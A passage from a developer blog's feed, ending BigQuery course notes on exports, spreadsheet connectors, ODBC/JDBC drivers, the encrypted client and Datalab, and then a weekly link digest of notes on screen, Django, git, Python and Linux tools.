&lt;li&gt;Glob is replaced by shard value of 12 digits  &lt;/li&gt;
&lt;li&gt;Starts with 000000000000 and increments by 1 for each file  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Wildcard exports are written in parallel  &lt;ul&gt;
&lt;li&gt;Target files are smaller and parallel writers work on separate patterns immediately  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Wildcard exports are subject to quota limitations  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Single &amp;amp; Multiple Wildcard URI&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Single Wildcard URI  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;'destinationUris': ['gs://my-bucket/file-name-*.json']&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Multiple Wildcard URI  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;'destinationUris': ['gs://my-bucket/file-name-1-*.json', 'gs://my-bucket/file-name-2-*.json']&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;destinationUris&lt;/code&gt; property indicates export location(s) and file name(s)  &lt;/li&gt;
&lt;li&gt;Data sharded into multiple files based on the pattern  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 12: Interfacing with External Tools&lt;/h1&gt;
&lt;h2&gt;Interfacing with Spreadsheets&lt;/h2&gt;
&lt;h3&gt;BigQuery Connector for Microsoft Excel&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Supports Excel 2007 and up  &lt;/li&gt;
&lt;li&gt;Supports Windows and Mac  &lt;/li&gt;
&lt;li&gt;Access through authorization key  &lt;ul&gt;
&lt;li&gt;Time sensitive  &lt;/li&gt;
&lt;li&gt;Min 1 hour – Max 30 days  &lt;/li&gt;
&lt;li&gt;Key can be revoked  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Go to https://bigquery-connector.appspot.com  &lt;/li&gt;
&lt;li&gt;Select Google account to use  &lt;/li&gt;
&lt;li&gt;Record unique key and download IQY file  &lt;/li&gt;
&lt;li&gt;Follow site instructions to execute query from Excel  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/bigquery/docs/bigquery-connector-for-excel"&gt;https://cloud.google.com/bigquery/docs/bigquery-connector-for-excel&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://bigquery-connector.appspot.com"&gt;https://bigquery-connector.appspot.com&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Using Google Sheets with BigQuery&lt;/h3&gt;
&lt;p&gt;Although spreadsheet are not designed to handle big data, many business run on them and use them daily.&lt;br /&gt;
Spreadsheets are understandable by both technical and non-technical staff.&lt;br /&gt;
Spreadsheets allow for use of simple charts and graphs to be easily built.&lt;br /&gt;
You could also connect to BigQuery from Excel via an ODBC connector.  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Extend Google Sheets using App Script  &lt;/li&gt;
&lt;li&gt;Rich interface  &lt;/li&gt;
&lt;li&gt;JavaScript-based language  &lt;ul&gt;
&lt;li&gt;Create buttons, pulldowns, and so on  &lt;/li&gt;
&lt;li&gt;Create dynamic query parameters  &lt;/li&gt;
&lt;li&gt;Create visualizations  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OWOX BigQuery Reports Add-On  &lt;ul&gt;
&lt;li&gt;Save queries with preset variables  &lt;/li&gt;
&lt;li&gt;Create visualizations  &lt;/li&gt;
&lt;li&gt;Share results  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Alternative to writing scripts  &lt;/li&gt;
&lt;li&gt;Free version available  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;ODBC &amp;amp; JDBC Drivers&lt;/h2&gt;
&lt;h3&gt;Simba ODBC/JDBC Drivers (Beta)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Simba ODBC/JDBC Drivers 32-bit and 64-bit Available for Mac, Linux, Windows  &lt;/li&gt;
&lt;li&gt;Supports ANSI SQL-92: SELECT, JOIN, WHERE, HAVING, GROUP  &lt;/li&gt;
&lt;li&gt;BY, ORDER BY, TOP and most SQL-92 scalar and aggregate functions  &lt;/li&gt;
&lt;li&gt;Supports BigQuery’s SQL subset: SELECT, HAVING, WHERE, GROUP BY, ORDER BY, LIMIT, CASE and all functions  &lt;/li&gt;
&lt;li&gt;Supports all BigQuery data types (STRING, INTEGER, FLOAT, BOOLEAN, TIMESTAMP)  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Google has partnered with Simba Technologies to provide updated ODBC and JDBC drivers that leverage the power of BigQuery's Standard SQL (support is also provided for legacy SQL).&lt;br /&gt;
For more information on the Simba ODBC/JDBC drivers for BigQuery, see: &lt;a href="https://cloud.google.com/bigquery/partners/simba-beta-drivers"&gt;https://cloud.google.com/bigquery/partners/simba-beta-drivers&lt;/a&gt;.  &lt;/p&gt;
&lt;h3&gt;Other JDBC Drivers&lt;/h3&gt;
&lt;p&gt;還不 support insert 和 delete  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Starschema JDBC driver for BigQuery  &lt;ul&gt;
&lt;li&gt;Supports server and OAuth2 authentication  &lt;/li&gt;
&lt;li&gt;Supports handling metadata  &lt;/li&gt;
&lt;li&gt;Query transformation capabilities  &lt;/li&gt;
&lt;li&gt;Released to open source - No longer under active development  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CData JDBC driver for BigQuery  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.cdata.com/drivers/bigquery/"&gt;http://www.cdata.com/drivers/bigquery/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Abstracts BigQuery data source into tables, views, stored procedures use to access data  &lt;/li&gt;
&lt;li&gt;要用的時候要跟 Google 拿金鑰放在 JDBS 的 Driver 裏面  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Although the Starschema driver is available, no active work has been done since June 2013.&lt;br /&gt;
This means that any enhancements to BigQuery may not be reflected in the driver.  &lt;/p&gt;
&lt;h2&gt;Encrypted BigQuery Client&lt;/h2&gt;
&lt;h3&gt;Encrypted Client&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ebq&lt;/code&gt; commnad&lt;br /&gt;
&lt;a href="https://github.com/google/encrypted-bigquery-client"&gt;https://github.com/google/encrypted-bigquery-client&lt;/a&gt;&lt;br /&gt;
&lt;a href="https://github.com/google/encrypted-bigquery-client/blob/master/tutorial.md"&gt;https://github.com/google/encrypted-bigquery-client/blob/master/tutorial.md&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;An experimental extension to the BigQuery client  &lt;/li&gt;
&lt;li&gt;Offers client-side encryption for a subset of query types  &lt;/li&gt;
&lt;li&gt;Implemented in Python  &lt;/li&gt;
&lt;li&gt;Encrypts data before loading and transforms query to work on top of encrypted data  &lt;/li&gt;
&lt;li&gt;Only available as a replacement for bq CLI  &lt;/li&gt;
&lt;li&gt;Supports multiple encryption modes  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;Pseudonym&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;encrypts the data the same way, given a particular key  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Probabilistic&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;encrypts the same text differently every time  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Homomorphic&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Encrypts numeric fields with special mathematical properties allowing mathematical operations on encrypted data to yield encrypted results  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Searchwords&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Encrypts data so you can find a particular word within a longer string  &lt;/li&gt;
&lt;li&gt;same word is encrypted the same way every time  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Probabilistic_searchwords&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;combines the two types of encryption so that a word in encrypted a different way every time  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;None&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;No encryption  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Client Interaction&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Normal client interaction  &lt;ul&gt;
&lt;li&gt;Data on client in normal (unencrypted) state  &lt;/li&gt;
&lt;li&gt;Data moves between client and BigQuery over SSH  &lt;/li&gt;
&lt;li&gt;Data is encrypted in flight and at rest once in BigQuery  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Encrypted client interaction  &lt;ul&gt;
&lt;li&gt;Interface encrypts input data on client  &lt;/li&gt;
&lt;li&gt;Encrypted data moves between client and BigQuery over SSH  &lt;/li&gt;
&lt;li&gt;Data encrypted in flight and at rest once in BigQuery  &lt;/li&gt;
&lt;li&gt;Query results to client are encrypted  &lt;/li&gt;
&lt;li&gt;Client interface decrypts the results  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;BigQuery and R&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Environment for statistical computing  &lt;/li&gt;
&lt;li&gt;Contains large, integrated collection of data analysis tools  &lt;/li&gt;
&lt;li&gt;Graphical facilities  &lt;/li&gt;
&lt;li&gt;Simple and effective programming language  &lt;/li&gt;
&lt;li&gt;BigQuery added as extension package  &lt;/li&gt;
&lt;li&gt;BigQuery allows R to process very large datasets  &lt;/li&gt;
&lt;li&gt;Hundreds of modeling packages available  &lt;/li&gt;
&lt;li&gt;R provides very sophisticated analysis  &lt;/li&gt;
&lt;li&gt;Easy setup and use  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 13: Working with Google Analytics Premium Data&lt;/h1&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 14: Data Visualization&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.google.com/analytics/data-studio/"&gt;https://www.google.com/analytics/data-studio/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Third-party tools&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;BigQuery integrates with several open-source/commercial tools  &lt;ul&gt;
&lt;li&gt;Tableau, Qlik, iCharts  &lt;/li&gt;
&lt;li&gt;See &lt;a href="https://cloud.google.com/bigquery/third-party-tools"&gt;third-party tools and services&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;All tools provide report, dashboard creation capability  &lt;/li&gt;
&lt;li&gt;Vendor offerings may be cloud-based, client-based, both  &lt;/li&gt;
&lt;li&gt;Each tool may have a different underlying proprietary technology  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Spreadsheet Visualization&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Cost-effective option  &lt;/li&gt;
&lt;li&gt;Limited in business intelligence functionality  &lt;/li&gt;
&lt;li&gt;Visualization capabilities may not be as robust as a business intelligence tool  &lt;ul&gt;
&lt;li&gt;May require additional scripting  &lt;/li&gt;
&lt;li&gt;搭配 Google App Script 使用  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use third-party application or ODBC driver  &lt;ul&gt;
&lt;li&gt;BigQuery Connector for Microsoft Excel  &lt;/li&gt;
&lt;li&gt;Simba ODBC Driver  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Datalab&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/datalab/docs/quickstarts/"&gt;https://cloud.google.com/datalab/docs/quickstarts/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Use Datalab on Google Cloud Shell&lt;/h3&gt;
&lt;p&gt;好像只要直接在 Cloud Shell 用&lt;a href="https://cloud.google.com/datalab/docs/quickstarts/quickstart-local"&gt;在 local 用 docker 執行 datalab 的方法&lt;/a&gt;就行了&lt;br /&gt;
&lt;code&gt;docker run -it -p "127.0.0.1:8081:8080" -v "${HOME}:/content" -e "PROJECT_ID=${PROJECT_ID}" gcr.io/cloud-datalab/datalab:local&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;不需要用到 &lt;a href="https://cloud.google.com/datalab/docs/quickstarts/quickstart-gcp"&gt;https://cloud.google.com/datalab/docs/quickstarts/quickstart-gcp&lt;/a&gt;&lt;br /&gt;
&lt;code&gt;docker run -it -p "127.0.0.1:8081:8080" -v "${HOME}:/content" -e "GATEWAY_VM=project-id/zone/instance-name" gcr.io/cloud-datalab/datalab:local&lt;/code&gt;&lt;br /&gt;
因為用這個方法似乎還得額外開一台 VM。  &lt;/p&gt;
&lt;p&gt;在 Cloud Shell 輸入&lt;br /&gt;
&lt;code&gt;docker run -it -p "127.0.0.1:8081:8080" -v "${HOME}:/content" -e "PROJECT_ID=${DEVSHELL_PROJECT_ID}" gcr.io/cloud-datalab/datalab:local&lt;/code&gt;&lt;br /&gt;
(好像有些 Cloud Shell 不知道為何會沒有 &lt;code&gt;$DEVSHELL_PROJECT_ID&lt;/code&gt;，沒有的話就手動輸入吧)&lt;br /&gt;
好了之後再點選左上角第一個 Web preview，選擇 Change port 8081，應該就會開啟一個連到剛剛建立的 datalab 的分頁了  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;BigQuery Public datasets&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.gdeltproject.org/data.html#googlebigquery"&gt;http://www.gdeltproject.org/data.html#googlebigquery&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://nyctaximap.appspot.com/"&gt;http://nyctaximap.appspot.com/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.reddit.com/r/bigquery/"&gt;https://www.reddit.com/r/bigquery/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/bigquery/public-data/"&gt;https://cloud.google.com/bigquery/public-data/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Google Cloud Platform"></category></entry><entry><title>Y2016W49</title><link href="https://blog.m157q.tw/posts/2016/12/12/y2016w49/" rel="alternate"></link><published>2017-02-05T12:10:10+08:00</published><updated>2017-02-05T12:10:10+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-12-12:posts/2016/12/12/y2016w49/</id><summary type="html">&lt;h3&gt;cli&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://tomlee.co/2011/10/gnu-screen-splitting/"&gt;GNU Screen splitting&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;CTRL-a SHIFT-\&lt;/code&gt; (&lt;code&gt;CTRL-a |&lt;/code&gt;) (:split -v) to split the screen vertically.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;CTRL-a SHIFT-s&lt;/code&gt; (&lt;code&gt;CTRL-a S&lt;/code&gt;) (:split) to split the pane horizontally.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;CTRL-a TAB&lt;/code&gt; to move between the panes  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;CTRL-a SHIFT-x&lt;/code&gt; (&lt;code&gt;CTRL-a X&lt;/code&gt;) will close the pane that has focus  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;CTRL-a d&lt;/code&gt; will detach screen from the TTY and put it in the background. Resume with &lt;code&gt;screen -r&lt;/code&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;CTRL-a n&lt;/code&gt; and &lt;code&gt;CTRL-a p&lt;/code&gt; shifts input focus to the next &amp;amp; previous window, respectively.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;CTRL-a SHIFT-a&lt;/code&gt; (&lt;code&gt;CTRL-a A&lt;/code&gt;) will ask you to set the title of the focus window.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;CTRL-a SHIFT-'&lt;/code&gt; (&lt;code&gt;CTRL-a "&lt;/code&gt;) list available windows  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;django&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/21351251/database-returned-an-invalid-value-in-queryset-dates"&gt;mysql - Database returned an invalid value in QuerySet.dates() - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Appreciate your help to resolve it.   Looks like error caused Django's 1.6 timezone functionality changes(https://docs.djangoproject.com/en/1.6/ref/databases/#time-zone-definitions).  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;用公司的 Django 1.6 時遇到的問題，要在 model 裏面使用 &lt;code&gt;timezone&lt;/code&gt; 的話，必須要在 MySQL 先載入 timezone 相關的 table  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;mysql_tzinfo_to_sql /usr/share/zoneinfo | mysql -D mysql -u root -p&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;git&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://gitready.com/intermediate/2009/02/13/list-remote-branches.html"&gt;git ready » list remote branches&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Sometimes you may need to figure out what branches exist on a remote repository so you can pull them down and check them out, merge them into your local branches, etc.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;git branch -r&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/mre/awesome-static-analysis"&gt;GitHub - mre/awesome-static-analysis: A curated list of static analysis tools, linters and code quality checkers for various programming languages&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Static program analysis is the analysis of computer software that is performed without actually executing programs (analysis performed on executing programs is known as dynamic analysis). — Definition by Wikipedia  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;一個收集跟 static analysis 有關的 repo  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/asdf-vm/asdf"&gt;GitHub - asdf-vm/asdf: Extendable version manager with support for Ruby, Node.js, Elixir, Erlang &amp;amp; more&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Supported languages include Ruby, Node.js, Elixir and more. Supporting a new language is as simple as this plugin API.  If you use zsh or any other shell, replace .bashrc with the config file for the respective shell.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/commaai/research"&gt;commaai/research: comma.ai for the people to experiment with&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;7 and a quarter hours of largely highway driving. Enough to train what we had in Bloomberg.  Dataset referenced on this page is copyrighted by comma.ai and published under the Creative Commons Attribution-NonCommercial-ShareAlike 3.0 License.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;geohot 之前為了做自動駕駛系統所蒐集的資料，雖然後來因為法律問題而不做了，但把他們公開出來給想要做的人使用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/alex/what-happens-when"&gt;GitHub - alex/what-happens-when: An attempt to answer the age old interview question "What happens when you type google.com into your browser and press enter?"&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;What happens when... This repository is an attempt to answer the age old interview question "What happens when you type google.com into your browser's address box and press enter?" Except instead of the usual story, we're going to try to answer this question in as much detail as possible.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;非常詳細的講解一個有點歷史的面試問題：「在瀏覽器的網址輸入 google.com 並按下 enter 發生了哪些事」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/xxhomey19/PPAV"&gt;GitHub - xxhomey19/PPAV: This is an amazing Facebook messenger bot. Welcome to visit our fan page&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;用 Facebook Messenger Bot 來搜尋 Adult Video，爆紅沒幾天就被 Facebook ban 了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;job&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/notes/meng-ju-leu/job-hunting/1171750332901548"&gt;https://www.facebook.com/notes/meng-ju-leu/job-hunting/1171750332901548&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「每天 7:00 起床，7:20 出門上班，晚上 7 點到學校圖書館念書這樣的生活步調，假日也都是在圖書館寫題目、複習知識。 」  &lt;/li&gt;
&lt;li&gt;也太認真了吧 我好慚愧  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2016/12/user_space_vs_kernel_space.html"&gt;User space 与 Kernel space - 阮一峰的网络日志&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;簡單講解而已，然後提了一下用 &lt;code&gt;time&lt;/code&gt; 這個指令出來的數字跟這個之間的關係。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;i3wm  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://faq.i3wm.org/question/239/how-do-i-suspendlockscreen-and-logout.1.html"&gt;How do i suspend,lockscreen and logout? - i3 FAQ&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://faq.i3wm.org/question/3747/enabling-multimedia-keys.1.html"&gt;Enabling multimedia keys - i3 FAQ&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;花點時間改了一下 i3wm 的快捷鍵，主要就是要在 i3 的 ‵config‵ 裡頭用 &lt;code&gt;bindsym&lt;/code&gt; 去綁定按鍵要觸發的 script  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;machine_learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://opensource.googleblog.com/2016/12/open-sourcing-deepmind-lab.html"&gt;Google Open Source Blog: Open-sourcing DeepMind Lab&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;A customisable 3D platform for agent-based AI research  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/deepmind/lab"&gt;https://github.com/deepmind/lab&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://jeffknupp.com/blog/2016/12/09/how-python-linters-will-save-your-large-python-project/"&gt;How Python Linters Will Save Your Large Python Project&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;作者推薦了 3 個檢查 Python coding style 的工具：&lt;code&gt;pylint&lt;/code&gt;, &lt;code&gt;pycodestyle&lt;/code&gt;, &lt;code&gt;pydocstyle&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;原來這種檢查 coding style 的工具可以直接叫作 linter 啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;複習一下 Python 的 ‵@property‵ 的用法  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.programiz.com/python-programming/property"&gt;Python @property: How to Use it and Why? - Programiz&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/17330160/how-does-the-property-decorator-work"&gt;python - How does the @property decorator work? - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.digitalocean.com/community/tutorials/python-2-vs-python-3-practical-considerations-2"&gt;Python 2 vs Python 3: Practical Considerations | DigitalOcean&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;比較了 Python 2 和 Python 3 的一些差異  &lt;/li&gt;
&lt;li&gt;到目前為止對我來說最難搞懂的大概還是這兩個的 encode 和 decode 的關係吧，雖然在最近讀到的 Effective Python 裡頭有一章就是在講這個，但駑鈍如我還是常常搞混。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.ithome.com.tw/news/110022"&gt;研究人員只花6秒就能破解盜刷Visa信用卡 | iThome&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「利用「分散式猜測攻擊」（Distributed Guessing Attack）來破解Visa信用卡的到期日與安全碼，最快可在6秒內找出正確數值並進行盜刷。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;software_engineering&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;[[好文導讀] [Dear Product Managers …] 親愛的產品經理- 來自曾經支持你的工程團隊!](http://www.evanlin.com/reading-dear-pm/)  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;stackoverflow&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://unix.stackexchange.com/questions/10178/how-do-i-force-remove-a-package-in-arch-with-pacman"&gt;How do I force remove a package in Arch with pacman? - Unix &amp;amp; Linux Stack Exchange&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;用 &lt;code&gt;pacman -R&lt;/code&gt; 移除某個 package 的時候，如果有其他 package 相依於該 package 的話就無法移除  &lt;/li&gt;
&lt;li&gt;如果仍要強制移除該 package 的話，有兩種解法：  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;pacman -Rd&lt;/code&gt;: 不管相依性，直接強制移除該 package。  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;pacman -Rc&lt;/code&gt;: 把該 package 跟所有相依於該 package 的 packages 全部一起移除掉（注意：會遞迴下去）。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/1670970/how-to-cherry-pick-multiple-commits"&gt;git - How to cherry-pick multiple commits - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;git cherry-pick A..B&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;every commit after A up to and including B.  &lt;/li&gt;
&lt;li&gt;not include commit A.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;git cherry-pick A^..B&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;include commit A.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Commit A should be older than commit B. If they're the wrong order the command will silently fail.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;unix&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/dspinellis/unix-history-repo"&gt;GitHub - dspinellis/unix-history-repo: Continuous Unix commit history from 1970 until today&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;雖然之前就 Star 過哩  &lt;/li&gt;
&lt;li&gt;還是手動收藏一下吧  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;vim&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/vim-syntastic/syntastic/issues/204"&gt;Syntastic overrides let g:syntastic_python_checker = 'flake8 --ignore=E501' · Issue #204 · vim-syntastic/syntastic · GitHub&lt;/a&gt;  &lt;ul&gt;
